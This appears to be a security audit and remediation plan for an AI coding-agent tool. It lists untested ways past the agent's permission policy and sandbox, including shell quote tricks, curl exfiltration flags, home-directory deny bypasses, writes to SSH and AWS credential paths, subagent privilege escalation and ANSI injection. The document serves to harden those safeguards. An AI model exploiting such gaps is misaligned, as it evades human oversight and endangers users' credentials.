- **Phase 17:** 64 KiB body fit probed ASCII only (no emoji/CJK or `candidate.criteria` overflow); Ollama auth never probed `http://` non-loopback, `0.0.0.0`, `127.1`, or repo `local_base_url`; choice validation never probed unlisted probability keys or 20k-key tolerance blowup; `LLMDecisionModel` retry never exercised real `AnthropicModel` across closed loops.
- **Phase 18:** Tarball tests probed `Content-Length` + uncompressed size only (no gzip/xz bomb or `_github_get_json` streaming bound); symlink probes missed symlinked `<ns>` (`_atomic_swap_skill_dir` off-by-one) & intermediate local dirs; `update_installed_skills` never probed untrusted local `repo_url`; rollback never probed `save_lockfile` failure; `sanitize_display` missed `scripts/*` filenames, `allowed_tools`, `source_url`, and `PolicyGateHandler` `Risk:`; `load_cached_catalog` never probed `{"skills": null}`.
- **Phase 19 & 19.1 Tests 1–2:** Host Box `strands-box 0.3.1` UAT only ran `box run -- --help` (missing `shell:exec`/`fs:*` default-deny, `.venv` `pytest` deadlock, and hidden host `~/.config/strands-code/`); Test 1d omitted non-BMP TOML surrogates; Phase 19.1 Probes 1–2 missed `sh -c` quote inversion, `is_fetch_get` `file://`/`$VAR`/`-H @`/`-b`/`--stderr`/`-w %output`, `search` `.e*` / `_fallback_search`, `~` deny bypass, relative outside-root allow globs, `write`/`edit` `~/.ssh` & `~/.aws`, `/tmp*` widening to `/`, corrupt/symlinked repo `policy.toml` wiping home denies, `EOFError` in `run_prompt()`, `btw`→`subagent` read-only escalation, and `Syntax`/raw `Risk:` ANSI injection.

---

## Already-Tracked Reference (`V1_V2_PARITY_AUDIT.md`)

Items already tracked and queued cleanly elsewhere (omitted from counts above):
- **`[TRACKED-19.2]`:** `_discover_google_models()` / `_discover_bedrock_models()` / OpenAI / Anthropic discovery `timeout`/`max_retries`/`_has_unsafe_model_chars`; `bedrock-mantle/` `_vendor_of` & 4 `_provider_of` helpers; `window_for` docstring order; `OPENAI_BASE_URL`/`ANTHROPIC_BASE_URL` validation; `litellm`+`base_url` `api_key="not-required"`; `decisions_api`/`llm` in `/route setup`; `_route_pre_turn` double-record; paid routing tokens dropped on hold; `actual` vs `estimated` native router lane; missing `OPENROUTER_API_KEY` skip note; redundant `/models`/`/skill`/`refresh`/`uninstall` aliases; undeclared `httpx` & `agentcore`/`litellm` extras; `tests/conftest.py` missing AWS/Ollama/XDG scrubs; `_provider_from_model_id` for `bedrock-mantle`/`litellm`/`ollama` + dead `tomllib = None` shims.
- **`[TRACKED-20]`:** `codeact_read`/`write`/`edit`/`shell` inner policy/scope/`PendingStore` checks under Monty VM.
- **`[TRACKED-21]`:** `"document"` `ContentBlock` in `convert_history`.
- **`[TRACKED-23]`:** Split oversized modules (`model_switch.py`, `loop/core.py`, `dispatch/core.py`, `marketplace.py`) & repo-wide doc resync.

---

## Recommended Triage / Remediation Buckets

1. **Bucket 1 — Immediate Security & Sandbox Containment (Pre-19.2 / Current Phase 19.1 Security Sweep):**
   - `policy/core.py` & `scope.py` & `policy_gate.py`: `sh -c` matched-quote check; `is_fetch_get()` HTTP(S)-only + `$` metachar + exfil/write curl flags; `search` dotfile/wildcard secret protection & `_fallback_search` dotfile guard; `~` expansion in `_match_path_rule()`; relative globs confined inside `cwd` + `effective_roots` prefix-glob guard; add `~/.ssh` & `~/.aws` to protected write paths; isolate home vs repo `PolicyConfig.load()` error handling so broken/symlinked repo TOML never wipes home `[[deny]]`; `EOFError`/`RuntimeError` guard + lock fix in `ApprovalBroker`; `RLock` + finalizer-identity check in `PolicyGateHandler`; caller-scoped read-only check in `subagent`; non-BMP TOML `ensure_ascii=False`; `Syntax`/`Risk:` ANSI sanitization; `_derive_rule` for `search(file_glob)`, `TOOL_ONLY_TOOLS`, and `~`.
   - `memory/marketplace.py` & `memory/skills.py` & `dispatch/core.py`: fix 4-hop `dest_dir.parent.parent.parent.parent` in `_atomic_swap_skill_dir`; call `_validate_sync_source` in `update_installed_skills`; add streamed decompressed byte/entry caps in `_validate_tarball_stream`, `discover_catalog_from_tarball`, and `_github_get_json`; full ancestor confinement in local discovery/copy; `.gitmodules` case-insensitive + `\x1b`/control-char rejection + `sanitize_display`; atomic backup-restore on `save_lockfile` failure + `parse_constant` + `skills: null` guard; `discover_plugin_sources` symlink & provenance fixes.
   - `routing/`: validate `probabilities.keys() <= set(live)` & bounded `tol`; restrict `ollama_headers` to `https://` or verified loopback (`0.0.0.0`/`[::]`/`127.1` inclusive) & block repo `local_base_url` auth leakage; `run_llm_decision` fresh `Model` inside `_invoke()` + UTF-8 byte fit + criteria cap; `Approval` / `/cost` negative guard.
   - `sandbox/box.py`: add `shell:exec` + `fs:*` `permit` rules to `policy.dw`, resolve `.venv` `[tool.pytest]` deadlock, fix Anthropic `Authorization: Bearer` egress header, harden `push_requires_recent_tests` against `git -c alias` / `uv` / non-test `pytest`, pass/protect `XDG_CONFIG_HOME` & `XDG_CACHE_HOME` inside `[agent.env]`, fix `_toml_str(..., ensure_ascii=False)`, harden `box doctor`/`run` ancestor symlinks & AppArmor checks.

2. **Bucket 2 — Provider, Resume, Subagent & `/btw` Correctness (Cross-Phase Fixes):**
   - Stamp `_strands_model_ref` in `resolve_harness_model()` / `build_agent()` so `model_id_of()` never loses provider prefixes (fixing `/btw` `/cost` Bedrock-Price-List regression, usage normalization, `/route` fast-path, `configure_openai_for_model`, `scoped_base_url`, and `build_btw_agent` `caching=False` guard).
   - Fix `prepare_resumed_history()` (skip stripping on same-provider Anthropic/Gemini, convert direct non-Bedrock sessions resumed onto Bedrock, verify `prefix_hash` against stale `rich.model_id`) and fix `apply_model_action()` multi-hop tail conversion.
   - Remove redundant `"web_search"` AgentCore tool when switching to native `web_search` providers; route `subagent` `spec.model="meta/..."` through `build_meta_model()` and propagate `api_mode`; isolate `fresh_side_model()` `AnthropicModel` instances across concurrent threads/event loops; strip `toolUse["reasoningSignature"]` in `fork_btw_history()` & `subagent`; fix Vertex `publishers/google/models/` discovery, `gpt-4-0613` non-reasoning, Meta auxiliary model isolation, `--model <arn>`, `BedrockModel` cache percentage, `scrub_credentials()` `x-api-key`/`x-goog-api-key`, `GOOGLE_GENAI_USE_VERTEXAI` & `OPENAI_BASE_URL` / `ProviderConfig.base_url` wiring, and `0f6c325` OpenRouter Llama / `_MEDIA_LESS` vs doc reconciliation.

3. **Bucket 3 — Strengthen Repeatable Rigs & Live Host UAT Probes:**
   - Replace mocked `_ReplayModel` prefixed IDs, add post-switch live turns to `u1`/`g1`/`o1`/`an1`/`m1`, enforce full `HOME`/`~/.aws` isolation in zero-AWS rigs, check in missing Phase 14 scripts or merge into `scripts/uattest/`, test real `strands-box 0.3.1` hosted Shell commands (`ls`, `echo`, `printf`, `pytest`), and enforce `INVARIANTS.md` § 5 Adversarial Pre-Check Loop on every remaining Phase 19.1 Test (Tests 2–6) and all future `v2.0` UATs.
